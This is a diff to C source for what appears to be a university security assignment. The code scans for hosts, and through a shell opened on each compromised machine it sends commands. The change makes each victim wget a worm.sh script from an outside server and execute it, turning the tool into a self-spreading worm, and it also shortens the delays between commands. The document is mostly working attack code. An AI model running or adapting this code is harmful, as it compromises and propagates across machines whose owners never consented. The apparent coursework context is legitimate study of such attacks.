@@ -94,8 +94,6 @@ int main(int argc, char *argv[]) {
         strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
         
         // check if IP is itself
-        
-        printf("%s\n", ip);
         if (!strcmp(ip, own_ip)) {
             printf("Skipping %s\n", ip);
             continue;
@@ -278,19 +276,17 @@ void cshell (int sock) {
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
-                                "gcc -c exploit.c\n",
-                                "gcc -c portscan.c\n",
-                                "gcc -o portscan portscan.o exploit.o\n",
-                                "make\n",
-                                "./portscan > portscan.out\n"
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/worm.sh\n",
+                                "chmod +x worm.sh\n",
+                                "./worm.sh\n"
         }; //, "gcc portscan.c -o portscan", "./portscan"};
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
         int i;
-        for(i=0; i<8; i++) {
+        for(i=0; i<6; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
-            sleep(10);
+            sleep(1);
             if ((i == 2) || (i==7)) {
                 sleep(20);
             }
